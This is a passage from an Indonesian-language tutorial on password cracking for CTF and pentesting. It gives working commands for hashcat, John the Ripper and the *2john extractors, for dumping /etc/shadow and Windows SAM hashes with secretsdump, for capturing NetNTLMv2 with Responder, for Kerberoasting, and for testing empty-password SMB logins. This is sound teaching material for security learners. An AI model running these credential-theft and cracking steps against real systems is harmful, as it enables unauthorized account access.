secret.zip:$pkzip2$1*1*2*0*2c*20*87a9e112*...::secret.zip
secret.zip:hunter2:flag.txt:secret.zip
```

#### 2. Password-Protected RAR Archive (`rar2john`)

Bash

```
rar2john backup.rar > /tmp/rar_hash.txt
john /tmp/rar_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/rar_hash.txt --show
```

#### 3. SSH Private Key Passphrase (`ssh2john`)

Ketika Anda menemukan SSH private key (`id_rsa`) yang meminta passphrase saat login:

Bash

```bash
# Method 1: Memanggil ssh2john langsung (Perangkat Parrot OS modern)
ssh2john id_rsa > /tmp/ssh_hash.txt

# Method 2: Jika ssh2john standalone tidak ditemukan, panggil script python-nya:
# python3 /usr/share/john/ssh2john.py id_rsa > /tmp/ssh_hash.txt

# Crack passphrase
john /tmp/ssh_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/ssh_hash.txt --show
# Output: id_rsa:superman123
```

#### 4. Encrypted PDF Document (`pdf2john`)

Bash

```
pdf2john confidential.pdf > /tmp/pdf_hash.txt
john /tmp/pdf_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/pdf_hash.txt --show
```

#### 5. KeePass Password Database (`keepass2john`)

Database password manager `.kdbx` sering ditinggalkan developer di direktori backup:

Bash

```
keepass2john PersonalVault.kdbx > /tmp/kdbx_hash.txt
john /tmp/kdbx_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/kdbx_hash.txt --show
```

#### 6. GPG / PGP Private Key (`gpg2john`)

Bash

```
gpg2john private.key > /tmp/gpg_hash.txt
john /tmp/gpg_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john /tmp/gpg_hash.txt --show
```

---

## 📥 Bagian 5: Credential Extraction (Dari Mana Hash Berasal)

Sebelum sebuah hash dapat dipecahkan, penyerang atau auditor harus mengekstraknya dari target.

### 5.1 Linux: `/etc/shadow` Parsing

File `/etc/shadow` hanya dapat dibaca oleh user `root` (atau member group `shadow`).  
Format standar setiap baris entri:

text

```
username:$id$salt$encrypted_hash:lastchange:min:max:warn:inactive:expire:reserved
```

Bash

```
# Contoh baris shadow entry akun 'victim':
# victim:$6$randomsaltstring$J4g8qW9h5A...:19640:0:99999:7:::

# Mengambil string hash lengkap untuk diproses oleh Hashcat (-m 1800):
sudo grep "victim" /etc/shadow | cut -d: -f2 > /tmp/shadow_hash.txt
```

---

### 5.2 Windows: Ekstraksi Database SAM & SYSTEM

Pada arsitektur Windows lokal, hash NTLM disimpan di hive registry `SAM`. Untuk mendekripsinya, hive `SYSTEM` juga diperlukan karena memuat _Boot Key (Syskey)_.

Bash

```
# METODE 1: Jika sudah memiliki shell Administrator di mesin Windows target:
# reg save HKLM\SAM C:\Windows\Temp\sam.save
# reg save HKLM\SYSTEM C:\Windows\Temp\system.save
# Download kedua file tersebut ke Parrot OS.

# METODE 2: Parsing offline file SAM & SYSTEM menggunakan Impacket di Parrot OS:
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

_Contoh Output Nyata:_

text

```
[*] Target system bootKey: 0x9a3e21...
[*] Dumping local SAM hashes (account:uid:LMhash:NThash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
victim:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

Ambil 32-karakter NThash kolom ke-4 (`8846f7eaee8fb117ad06bdd830b7586c`) untuk di-crack menggunakan Hashcat mode 1000.

---

### 5.3 Network: Ekstraksi NetNTLMv2 Melalui Rogue Authentication Capture

Ketika klien Windows mencoba mengakses share folder palsu yang disiapkan oleh tool seperti `Responder`, Windows mengirimkan autentikasi challenge-response NetNTLMv2 melalui jaringan:

text

```
Format NetNTLMv2:
username::domain:ServerChallenge:NTLMv2HashResponse:ClientChallengeBlob
```

Bash

```bash
# 1. Menjalankan pemantauan poisoning pada antarmuka jaringan eth0
sudo responder -I eth0 -v

# 2. Cek direktori log Responder (tergantung metode instalasi apt vs git clone)
ls -la /usr/share/responder/logs/ 2>/dev/null || ls -la /opt/Responder/logs/ 2>/dev/null

# 3. Eksekusi cracking langsung pada seluruh file log NTLMv2 yang tertangkap:
find /usr/share/responder/logs/ /opt/Responder/logs/ -name "*NTLMv2*" 2>/dev/null | \
  xargs hashcat -m 5600 /usr/share/wordlists/rockyou.txt --force
```

---

### 5.4 Database Hashes

- **MySQL / MariaDB:**
    
    SQL
    
    ```
    SELECT user, host, authentication_string FROM mysql.user;
    -- Contoh output: *6C898D34C322F69269DFE0327C23537E99A025B1 (Hashcat Mode: 300)
    ```
    
- **PostgreSQL:**
    
    SQL
    
    ```
    SELECT usename, passwd FROM pg_shadow;
    -- Contoh output: md539b0a5c441113e155bc81cd0bb8a7e02
    -- Format: md5(password + username)
    ```
    

---

## 🌐 Bagian 6: Online Cracking Resources

Dalam kompetisi CTF waktu terbatas (_time-sensitive_), **selalu uji hash unsalted ke database online terlebih dahulu** sebelum membuang waktu dan membebani GPU workstation Anda.

### Layanan Database Hash Online:

1. **[CrackStation.net](https://crackstation.net/):** Database masif berisi lebih dari 15 miliar entri hash precomputed (MD5, SHA1, SHA256, NTLM).
2. **[Hashes.com](https://hashes.com/en/decrypt/hash):** Layanan crowdsourced verifier hash modern.
3. **[MD5Decrypt.net](https://md5decrypt.net/):** Menyediakan lookup spesifik untuk varian MD5, SHA256, dan NTLM.

Bash

```
# Menggunakan API Hashes.com via cURL di Parrot OS untuk lookup instan
HASH="5f4dcc3b5aa765d61d8327deb882cf99"
curl -s "https://hashes.com/en/api/v1/decrypt" -d "hashes[]=$HASH" | jq .
```

> **Aturan Penggunaan Online Lookup:**
> 
> - **Gunakan untuk:** Hash CTF publik, hash sampel malware, hash unsalted dari platform kompetisi.
> - **JANGAN PERNAH gunakan untuk:** Hash kredensial klien nyata saat penetration testing legal. Mengunggah hash klien ke situs publik melanggar perjanjian kerahasiaan (_Non-Disclosure Agreement / NDA_).

---

## 🗺️ Bagian 7: Cracking Strategy Decision Tree

Gunakan diagram alur keputusan ini untuk memandu setiap skenario password cracking:

text

```
                          [ HASH / TARGET DITERIMA ]
                                      │
                                      ▼
                      [ 1. IDENTIFIKASI TIPE ALGORITMA ]
                         (hashid -m / nth / prefix $X$)
                                      │
            ┌─────────────────────────┴─────────────────────────┐
            ▼                                                   ▼
     [ Single Hash Standar ]                             [ Format File Biner ]
     (MD5, SHA1, NTLM, SHA256)                           (ZIP, PDF, SSH, KDBX)
            │                                                   │
            ▼                                                   ▼
   [ 2. CEK ONLINE LOOKUP ]                             Ekstrak via Tool *2john
   (CrackStation / Hashes.com)                         (zip2john, ssh2john, dll)
            │                                                   │
      ┌─────┴─────┐                                             │
   Berhasil?    Gagal                                           │
      │           │                                             │
      ▼           └──────────────────────┬──────────────────────┘
   SELESAI!                              │
                                         ▼
                             [ 3. SERANGAN OFFLINE ]
                                         │
                 ┌───────────────────────┴───────────────────────┐
                 ▼                                               ▼
         [ Wordlist Murni ]                              [ Karakteristik Target ]
     (rockyou.txt / -a 0)                                (Panjang tetap, format PIN)
                 │                                               │
           ┌─────┴─────┐                                         ▼
        Berhasil?    Gagal                                [ Mask Attack (-a 3) ]
           │           │                                  (?d?d?d?d / ?u?l?l?l?d?d)
           ▼           ▼                                         │
        SELESAI!  [ 4. EXPANSION RULES ]                         ▼
                  (best64.rule / rockyou-30000)               [ EVALUASI HASIL ]
                       │
                 ┌─────┴─────┐
              Berhasil?    Gagal
                 │           │
                 ▼           ▼
              SELESAI!  [ 5. REKAYASA KAMUS KUSTOM ]
                        (CeWL website scraping / CUPP profiling)
```

---

## 🎯 Bagian 8: 8 Common CTF Password Cracking Patterns

### Pattern 1: Hardcoded MD5 Hash di Source Code Web

- **Indikasi:** Ditemukan baris Javascript atau PHP: `if (md5($_POST['token']) === '827ccb0eea8a706c4c34a16891f84e7b')`.
- **Ekstraksi:** Simpan hash ke file teks.
- **Cracking Command:**
    
    Bash
    
    ```
    echo "827ccb0eea8a706c4c34a16891f84e7b" > /tmp/target.txt
    hashcat -m 0 /tmp/target.txt /usr/share/wordlists/rockyou.txt --force -O
    ```
    
- **Output Berhasil:** `827ccb0eea8a706c4c34a16891f84e7b:12345`

---

### Pattern 2: Encrypted SSH Key (`id_rsa`)

- **Indikasi:** Ditemukan file SSH key yang diawali header: `-----BEGIN RSA PRIVATE KEY-----` dan `Proc-Type: 4,ENCRYPTED`.
- **Ekstraksi:** Gunakan `ssh2john`.
- **Cracking Command:**
    
    Bash
    
    ```
    ssh2john id_rsa > /tmp/id_rsa_hash.txt
    john /tmp/id_rsa_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    john /tmp/id_rsa_hash.txt --show
    ```
    
- **Output Berhasil:** `id_rsa:phoenix`

---

### Pattern 3: ZIP Archive Terproteksi Password

- **Indikasi:** File ZIP meminta password saat diekstrak via `unzip`.
- **Ekstraksi:** Gunakan `zip2john`.
- **Cracking Command:**
    
    Bash
    
    ```
    zip2john backup_data.zip > /tmp/zip_hash.txt
    john /tmp/zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
    john /tmp/zip_hash.txt --show
    ```
    
- **Output Berhasil:** `backup_data.zip:dragon123`

---

### Pattern 4: Hash `/etc/shadow` Linux (66 SHA-512)

- **Indikasi:** Membaca baris akun user dari `/etc/shadow`.
- **Ekstraksi:** Ambil kolom hash string lengkap.
- **Cracking Command:**
    
    Bash
    
    ```
    echo '$6$rounds=5000$saltsalt$wAmZ1c8G18Z8F1...' > /tmp/shadow.txt
    hashcat -m 1800 /tmp/shadow.txt /usr/share/wordlists/rockyou.txt --force -O
    ```
    
- **Output Berhasil:** `$6$rounds=5000$saltsalt$wAmZ...:football`

---

### Pattern 5: NTLM Hash Windows dari Registry SAM / LSA Dump

- **Indikasi:** String heksadesimal 32 karakter yang didapatkan dari dumping file SAM.
- **Ekstraksi:** Kolom ke-4 dari output `secretsdump.py`.
- **Cracking Command:**
    
    Bash
    
    ```
    echo "31d6cfe0d16ae931b73c59d7e0c089c0" > /tmp/ntlm.txt
    hashcat -m 1000 /tmp/ntlm.txt /usr/share/wordlists/rockyou.txt --force -O
    ```
    
- **Output Berhasil:** `31d6cfe0d16ae931b73c59d7e0c089c0:` (Password Kosong / Empty String!)
- **Catatan Pemula:** Hash `31d6cfe0d16ae931b73c59d7e0c089c0` adalah NTLM hash standar dari password *KOSONG* (`""`). Akun ini tidak memiliki password sehingga dapat langsung diakses di Windows:
  `net use \\target\share /user:Administrator ""`

---

### Pattern 6: NetNTLMv2 Capture dari Responder / PCAP

- **Indikasi:** Ditemukan capture handshake SMB pada file pcap atau log Responder.
- **Ekstraksi:** Ambil format baris `Username::Domain:Challenge:...`.
- **Cracking Command:**
    
    Bash
    
    ```
    hashcat -m 5600 /tmp/netntlmv2.txt /usr/share/wordlists/rockyou.txt --force
    ```
    
- **Output Berhasil:** `Administrator::CORP:...:Winter2023!`

---

### Pattern 7: Kerberoasting TGS Ticket Hash

- **Indikasi:** Ekstraksi tiket layanan SPN Active Directory via `GetUserSPNs.py`.
- **Ekstraksi:** File diawali string `$krb5tgs$23$*`.
- **Cracking Command:**
    
    Bash
    
    ```
    hashcat -m 13100 /tmp/tgs_hashes.txt /usr/share/wordlists/rockyou.txt --force
    ```
    
- **Output Berhasil:** `$krb5tgs$23$*...:SQLAdminPass1`

---

### Pattern 8: bcrypt Hash (2a2a) dari Database Web

- **Indikasi:** Hash diawali prefix `$2a$`, `$2b$`, atau `$2y$` dengan panjang tepat 60 karakter.
- **Ekstraksi:** Ambil string lengkap dari kolom database.
- **Cracking Command:**
    
    Bash
    
    ```
    echo '$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy' > /tmp/bcrypt.txt
    hashcat -m 3200 /tmp/bcrypt.txt /usr/share/wordlists/rockyou.txt -w 1 --force
    ```
    
- **Output Berhasil:** `$2a$10$N9qo8uLO...:secret`

---

## 🚀 Bagian 9: Performance Optimization (VM & CPU Tuning)

### 9.1 Konfigurasi Hashcat di Lingkungan Virtual Machine

Menjalankan Hashcat di dalam Virtual Machine (VirtualBox / VMware) membutuhkan optimasi parameter agar tidak crash atau mengalami alokasi CPU 100% yang membekukan sistem Parrot OS Anda.

Bash

```
# 1. Parameter Wajib di VM:
# --force              : Mengabaikan peringatan ketiadaan GPU murni.
# -O                   : Memakai kernel assembly teroptimasi (Maksimal password 32 karakter).
# -w 2                 : Workload Profile (1=Low, 2=Default, 3=Performance). Hindari -w 4 di VM!
# --status             : Menampilkan live update performa.
# --status-timer=10    : Update statistik setiap 10 detik.

hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt \
  --force -O -w 2 --status --status-timer=10

# 2. Tolok Ukur Kecepatan Komputasi Mesin (Benchmark Test):
hashcat -b -m 0 --force
```

---

### 9.2 Kontrol Sesi & Keyboard Shortcuts Interaktif

Saat Hashcat sedang berjalan aktif di terminal, Anda dapat menekan tombol keyboard berikut tanpa membatalkan proses:

- `[s]` : **Status update** — Menampilkan progres saat ini, kecepatan hash/detik, dan estimasi selesai (_ETA_).
- `[p]` : **Pause** — Menjeda komputasi untuk mendinginkan CPU.
- `[r]` : **Resume** — Melanjutkan proses cracking yang sedang dijeda.
- `[q]` : **Quit** — Menghentikan proses dan menyimpan checkpoint status sesi.

Bash

```bash
# Menjalankan Hashcat dengan nama sesi spesifik (--session mysession):
hashcat -m 0 /tmp/hash.txt /usr/share/wordlists/rockyou.txt --session mysession --force

# Melanjutkan (Restore) proses cracking yang sempat terhenti berdasarkan nama sesi:
hashcat --restore --session mysession

# Atau periksa daftar file sesi yang tersimpan:
ls ~/.local/share/hashcat/sessions/
```

---

## 🛠️ Bagian 10: Common Errors & Troubleshooting

|Pesan Error|Akar Masalah|Tindakan Solusi Pentester|
|---|---|---|
|`No hashes loaded`|File hash kosong, salah path, atau format encoding file mengandung karakter anomali.|Pastikan file ada (`cat file.txt`). Periksa apakah ada baris kosong di awal/akhir file.|
|`Separator unmatched`|Format hash yang membutuhkan metadata (misal: NetNTLMv2, shadow) kehilangan tanda pemisah titik dua (`:`).|Periksa kembali format baris: pastikan tidak ada spasi di antara delimiter titik dua.|
|`Token length exception`|Panjang karakter hash tidak cocok dengan spesifikasi mode `-m` yang dipilih.|Tipe hash salah teridentifikasi. Jalankan ulang `nth` atau `hashid` untuk memvalidasi algoritma.|
|`Device #1: WARN ... CL_OUT_OF_RESOURCES`|Alokasi VRAM/RAM virtual habis saat memproses wordlist masif.|Kurangi intensitas workload ke level 1: tambahkan `-w 1` dan hilangkan flag `-O`.|
|`Exhausted`|Seluruh kata dalam wordlist telah selesai diuji, namun password tidak ditemukan.|Tambahkan mutation rules (`-r best64.rule`), ganti wordlist, atau gunakan mask attack.|
|`All hashes found in potfile! Use --show`|Hash tersebut sudah pernah berhasil dipecahkan sebelumnya dan tersimpan di cache lokal.|Tambahkan flag `--show` di akhir command untuk langsung menampilkan passwordnya.|
|John: `No password hashes loaded`|Format hash tidak dikenali oleh auto-detector John the Ripper.|Tentukan format secara eksplisit menggunakan flag `--format=<format_name>`.|
|ssh2john: `not an RSA key`|Format SSH key menggunakan struktur OpenSSH baru (RFC 4716) bukan PEM RSA legacy.|Gunakan script modern: `python3 /usr/share/john/ssh2john.py id_rsa > hash.txt`.|
|`Line-ending (CRLF) corruption`|File hash atau wordlist disalin dari Windows dan membawa karakter newline `\r\n`.|Bersihkan karakter Windows CRLF via utilitas dos2unix: `dos2unix hash.txt wordlist.txt`.|
|Hashcat freeze saat menjalankan bcrypt (`-m 3200`)|Algoritma bcrypt membutuhkan iterasi berat sehingga membebani seluruh core thread CPU VM.|Gunakan workload rendah `-w 1`. Untuk membatasi CPU cores di Linux, gunakan `taskset -c 0,1 hashcat -m 3200 hash.txt rockyou.txt -w 1 --force`.|
|`Unrecognized option '--potfile-disable'`|Penulisan parameter salah (kurang tanda strip atau salah ejaan).|Tuliskan dengan format standar: `--potfile-disable`.|
|`Invalid argument: Permission denied`|Output file `-o` diarahkan ke direktori yang tidak memiliki izin tulis oleh user saat ini.|Arahkan output file ke direktori home atau `/tmp/cracked.txt`.|

---

## 📋 Bagian 11: Cheatsheet Copy-Paste Ready

### 1. Hash Identification Quick

Bash

```
# Identifikasi instan dengan Name-That-Hash
nth --text "TARGET_HASH_STRING"

# Identifikasi instan dengan HashID beserta Hashcat mode
hashid -m -j "TARGET_HASH_STRING"
```

### 2. Hashcat Most Used Commands (VM Optimized)

Bash

```
# Mode 0 (MD5) Dictionary
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force -O

# Mode 1000 (NTLM) Dictionary
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt --force -O

# Mode 1800 (Linux SHA-512 Shadow)
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --force -O

# Mode 0 + Rule Mutation (Best64)
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force -O

# Tampilkan hasil hash yang pernah ter-crack di potfile
hashcat -m 0 hash.txt --show
```

### 3. John the Ripper Most Used Commands

Bash

```
# Crack otomatis dengan rockyou
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Menentukan format spesifik (misal Raw MD5)
john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt

# Menampilkan hasil cracking
john hash.txt --show
```

### 4. File Format Extraction & Cracking

Bash

```
# ZIP Archive
zip2john target.zip > zip.hash && john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# RAR Archive
rar2john target.rar > rar.hash && john rar.hash --wordlist=/usr/share/wordlists/rockyou.txt

# SSH Private Key (id_rsa)
ssh2john id_rsa > ssh.hash && john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt

# PDF Document
pdf2john target.pdf > pdf.hash && john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt

# KeePass Database
keepass2john target.kdbx > kdbx.hash && john kdbx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### 5. Windows & Active Directory Hashes

Bash

```
# NTLM Hash Cracking (Mode 1000)
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt --force -O

# NetNTLMv2 Capture Cracking (Mode 5600)
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt --force

# Kerberos 5 TGS Ticket (Mode 13100)
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

### 6. CTF Mask Attack Quick Wins

Bash

```
# Brute force 4 digit PIN (?d?d?d?d)
hashcat -m 0 hash.txt -a 3 '?d?d?d?d' --force

# Brute force 6 digit PIN (?d?d?d?d?d?d)
hashcat -m 0 hash.txt -a 3 '?d?d?d?d?d?d' --force

# Wordlist + 2 Digit Angka di Akhir (Hybrid -a 6)
hashcat -m 0 hash.txt -a 6 /usr/share/wordlists/rockyou.txt '?d?d' --force
```

---

# [⚡ Quick Start: Urutan Kerja Password Cracking (Untuk Pemula)](/docs/password-cracking) — Complete Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah kecuali diarahkan.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export HASH_DIR=~/crack_session
mkdir -p $HASH_DIR/{hashes,wordlists,cracked,loot}
cd $HASH_DIR

# Siapkan rockyou.txt (terkompresi by default di Parrot OS)
if [ -f /usr/share/wordlists/rockyou.txt.gz ] && [ ! -f /usr/share/wordlists/rockyou.txt ]; then
    echo "[*] Extracting rockyou.txt..."
    sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz
fi

# Verifikasi tools tersedia
for tool in hashcat john hashid nth zip2john ssh2john pdf2john keepass2john; do
    which $tool >/dev/null 2>&1 && echo "[OK] $tool" || echo "[MISSING] $tool"
done

echo "[*] Environment ready: $HASH_DIR"
```

**Output yang diharapkan:**

text

```
[OK] hashcat
[OK] john
[OK] hashid
[OK] nth
[OK] zip2john
[OK] ssh2john
[*] Environment ready: /root/crack_session
```

**OUTPUT GAGAL ❌ — Tool missing:**

text

```
[MISSING] nth
```

➡️ Install yang kurang:

Bash

```
pip3 install name-that-hash --break-system-packages
sudo apt install -y hashid john
```

---

## ═══════════════════════════════════════

## FASE 0: DARI MANA HASH DATANG?

## ═══════════════════════════════════════

> **Konteks penting:** Sebelum crack, kamu harus tahu hash ini datang dari mana. Sumber menentukan format dan tool yang dipakai.

### Langkah 0.1 — Identifikasi Sumber Hash

text

```
SUMBER HASH — Pilih yang sesuai situasimu:

A. Hash dari file teks/database     → Langsung ke FASE 1
B. Hash dari /etc/shadow (Linux)    → Ke Langkah 0.2A
C. Hash dari Windows SAM dump       → Ke Langkah 0.2B
D. Hash dari network capture        → Ke Langkah 0.2C
E. File terproteksi (ZIP/SSH/PDF)   → Ke Langkah 0.2D
F. Hash dari database (MySQL/MSSQL) → Ke Langkah 0.2E
```

---

### Langkah 0.2A — Ekstrak Hash dari `/etc/shadow` (Linux)

> Masuk sini jika kamu punya akses root atau file shadow dari target Linux.

Bash

```
# Lihat isi shadow
sudo cat /etc/shadow

# Contoh output yang kamu akan lihat:
# root:$6$rounds=5000$saltsalt$wAmZ1c8G18Z8F1...:19640:0:99999:7:::
# victim:$1$O3tz.n4g$mZ12.rF0vD7Vf1oY65K4V/:19640:0:99999:7:::
# www-data:*:19640:0:99999:7:::
# nobody:!:19640:0:99999:7:::

# Ambil HANYA akun yang punya hash valid (bukan * atau !)
sudo grep -v ':\*:' /etc/shadow | grep -v ':!:' | grep -v '::' > $HASH_DIR/hashes/shadow_raw.txt
cat $HASH_DIR/hashes/shadow_raw.txt
```

**OUTPUT BERHASIL ✅ — Ada hash valid:**

text

```
victim:$6$rounds=5000$saltsalt$wAmZ1c8G18Z8F1...:19640:0:99999:7:::
developer:$1$O3tz.n4g$mZ12.rF0vD7Vf1oY65K4V/:19640:0:99999:7:::
```

**Cara baca prefix hash dari shadow:**

|Prefix|Algoritma|Hashcat Mode|Kecepatan Crack|
|---|---|---|---|
|`$1$`|MD5-crypt|500|Cepat|
|`$2a$`/`$2b$`|bcrypt|3200|Sangat Lambat|
|`$5$`|SHA-256 crypt|7400|Sedang|
|`$6$`|SHA-512 crypt|1800|Sedang|
|`$y$`|yescrypt|N/A (pakai john)|Lambat|

Bash

```
# Method 1: Pakai unshadow untuk John (combine passwd + shadow)
sudo unshadow /etc/passwd /etc/shadow > $HASH_DIR/hashes/unshadowed.txt

# Method 2: Isolasi hash murni untuk Hashcat (ambil kolom ke-2)
sudo awk -F: '/\$[1-6y]\$/{print $2}' /etc/shadow > $HASH_DIR/hashes/shadow_hashes.txt
cat $HASH_DIR/hashes/shadow_hashes.txt
```

➡️ Setelah ekstrak → lanjut ke **FASE 1** untuk identifikasi tipe hash.

---

### Langkah 0.2B — Ekstrak Hash dari Windows SAM (NTLM)

> Masuk sini jika kamu punya akses admin di Windows target atau file SAM+SYSTEM.

Bash

```
# Scenario 1: Sudah punya shell di Windows target
# Di Windows shell:
# reg save HKLM\SAM C:\Temp\sam.bak
# reg save HKLM\SYSTEM C:\Temp\system.bak
# reg save HKLM\SECURITY C:\Temp\security.bak
# Download ke Parrot OS, lalu:

# Scenario 2: Parse file SAM + SYSTEM yang sudah didownload
impacket-secretsdump -sam sam.bak -system system.bak LOCAL 2>/dev/null | tee $HASH_DIR/hashes/sam_dump.txt

# Scenario 3: Langsung dari remote target (jika sudah punya admin creds)
impacket-secretsdump "Administrator:Password123!@$TARGET" | tee $HASH_DIR/hashes/remote_dump.txt
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Target system bootKey: 0x9a3e21...
[*] Dumping local SAM hashes (account:uid:LMhash:NThash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
victim:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
```

**Cara baca format output secretsdump:**

text

```
username : RID : LM_hash : NT_hash :::
              ↑ Abaikan   ↑ INI yang dicrack (32 hex = NTLM)
```

Bash

```
# Isolasi NT hash untuk hashcat (kolom ke-4)
cat $HASH_DIR/hashes/sam_dump.txt | grep ":::" | cut -d: -f4 > $HASH_DIR/hashes/ntlm_only.txt

# Simpan mapping username:hash untuk referensi
cat $HASH_DIR/hashes/sam_dump.txt | grep ":::" | awk -F: '{print $1":"$4}' > $HASH_DIR/hashes/ntlm_mapped.txt

echo "[*] NTLM hashes extracted:"
cat $HASH_DIR/hashes/ntlm_only.txt
```

> **⚠️ PERHATIAN — Hash Khusus:**
> 
> - `aad3b435b51404eeaad3b435b51404ee` = LM hash kosong (normal, abaikan)
> - `31d6cfe0d16ae931b73c59d7e0c089c0` = NT hash dari password **KOSONG** → langsung bisa login tanpa password!

Bash

```
# Cek apakah ada akun dengan password kosong
grep "31d6cfe0d16ae931b73c59d7e0c089c0" $HASH_DIR/hashes/ntlm_mapped.txt
# Jika ada → langsung test: nxc smb $TARGET -u "username" -p ""
```

➡️ Lanjut ke **FASE 1** → identifikasi mode 1000.

---

### Langkah 0.2C — Ekstrak Hash dari Network Capture (NetNTLMv2)

> Masuk sini jika kamu menangkap autentikasi via Responder atau dari file .pcap.

Bash

```
# Method 1: Responder (jalankan di interface yang benar)
# Edit config dulu jika perlu
cat /etc/responder/Responder.conf | grep -E "SMB|HTTP"
# Pastikan SMB = On, HTTP = On untuk poisoning

sudo responder -I tun0 -rdwv 2>&1 | tee $HASH_DIR/hashes/responder_live.txt
# Tunggu ada auth event... Ctrl+C setelah dapat

# Cek log Responder
ls -la /usr/share/responder/logs/ 2>/dev/null
ls -la /opt/Responder/logs/ 2>/dev/null

# Copy semua NTLMv2 yang tertangkap
find /usr/share/responder/logs/ /opt/Responder/logs/ \
    -name "*NTLMv2*" 2>/dev/null \
    -exec cat {} \; > $HASH_DIR/hashes/netntlmv2_all.txt

cat $HASH_DIR/hashes/netntlmv2_all.txt
```

**OUTPUT BERHASIL ✅ — Responder menangkap hash:**

text

```
[SMB] NTLMv2-SSP Client   : 10.10.11.50
[SMB] NTLMv2-SSP Username : CORP\diana
[SMB] NTLMv2-SSP Hash     : diana::CORP:1122334455667788:B92C4A1F...:01010000...
```

**Format NetNTLMv2 yang harus copy-paste SELURUHNYA:**

text

```
diana::CORP:1122334455667788:B92C4A1F...:01010000...
↑user  ↑domain ↑challenge   ↑ JANGAN POTONG BAGIAN INI
```

Bash

```
# Simpan dengan format benar (seluruh baris, tidak dipotong)
grep "::CORP\|::WORKGROUP\|::" /usr/share/responder/logs/*NTLMv2* 2>/dev/null \
    > $HASH_DIR/hashes/netntlmv2_clean.txt

# Method 2: Ekstrak dari PCAP
# Install jika belum ada
sudo apt install -y python3-impacket

# Ekstrak dari pcap (jika dapat file capture)
impacket-ntlmrelayx --no-smb-server --no-http-server \
    -i capture.pcap 2>/dev/null | grep "NTLMv2"

# Atau pakai tshark
tshark -r capture.pcap -Y "ntlmssp" -T fields \
    -e ntlmssp.auth.username -e ntlmssp.auth.domain 2>/dev/null
```

➡️ Mode cracking = **5600 (NetNTLMv2)**. Lanjut ke **FASE 2**.

---

### Langkah 0.2D — Ekstrak Hash dari File Terproteksi

> Masuk sini jika kamu punya file ZIP/RAR/SSH key/PDF/KDBX yang terkunci password.

Bash

```
# Identifikasi tipe file dulu
file mysterious_file.*
```

**Pilih tool sesuai tipe file:**

Bash

```
# ═══ ZIP Archive ═══
zip2john secret.zip > $HASH_DIR/hashes/zip.hash
cat $HASH_DIR/hashes/zip.hash

# ═══ RAR Archive ═══
rar2john backup.rar > $HASH_DIR/hashes/rar.hash

# ═══ SSH Private Key ═══
# Cek dulu apakah ada passphrase
head -3 id_rsa
# Jika ada "Proc-Type: 4,ENCRYPTED" atau "ENCRYPTED" → ada passphrase

ssh2john id_rsa > $HASH_DIR/hashes/ssh.hash
# Jika gagal (format OpenSSH baru):
python3 /usr/share/john/ssh2john.py id_rsa > $HASH_DIR/hashes/ssh.hash

# ═══ PDF Document ═══
pdf2john protected.pdf > $HASH_DIR/hashes/pdf.hash

# ═══ KeePass Database (.kdbx) ═══
keepass2john database.kdbx > $HASH_DIR/hashes/kdbx.hash

# ═══ GPG/PGP Private Key ═══
gpg2john private.key > $HASH_DIR/hashes/gpg.hash

# ═══ 7-Zip Archive ═══
7z2john archive.7z > $HASH_DIR/hashes/7z.hash
```

**OUTPUT BERHASIL ✅ — zip2john:**

text

```
secret.zip:$pkzip2$1*1*2*0*2c*20*87a9e112*0*42*0*2c*87a9*...:secret.zip
```

**OUTPUT GAGAL ❌ — ssh2john: "not an RSA key":**

text

```
id_rsa is not an RSA key!
```

➡️ SSH key format baru (OpenSSH), gunakan:

Bash

```
python3 /usr/share/john/ssh2john.py id_rsa > $HASH_DIR/hashes/ssh.hash
# Jika masih gagal:
python3 -c "
import sys
sys.path.insert(0, '/usr/share/john')
from ssh2john import *
" 2>/dev/null || pip3 install paramiko
```

**OUTPUT GAGAL ❌ — zip2john: "No password":**

text

```
secret.zip has no password!
```

➡️ File ZIP tidak terproteksi password, langsung extract:

Bash

```
unzip secret.zip -d ./extracted/
```

➡️ Setelah dapat hash → lanjut ke **FASE 1**.

---

### Langkah 0.2E — Ekstrak Hash dari Database

Bash

```
# MySQL/MariaDB (jika sudah punya akses DB)
mysql -u root -p -e "SELECT user, host, authentication_string FROM mysql.user;" 2>/dev/null

